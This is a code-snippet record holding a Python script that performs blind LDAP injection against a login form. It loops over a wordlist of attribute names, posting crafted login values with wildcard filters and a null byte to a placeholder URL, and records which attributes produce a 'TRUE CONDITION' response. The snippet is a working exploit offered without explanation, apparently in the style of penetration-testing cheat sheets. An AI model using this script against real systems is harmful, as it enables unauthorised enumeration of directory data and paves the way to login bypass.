---
id: 4cab3ceb-c193-4236-8004-fd1af8bc16d1
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:01.711079+00:00'
updated_at: '2023-04-10T20:36:28.049222+00:00'
---

# Code Snippet 4cab3ceb

**Language**: Python

```python
#!/usr/bin/python3

import requests
import string

fields = []

url = 'https://URL.com/'

f = open('dic', 'r') #Open the wordlists of common attributes
wordl = f.read().split('\n')
f.close()

for i in wordl:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```


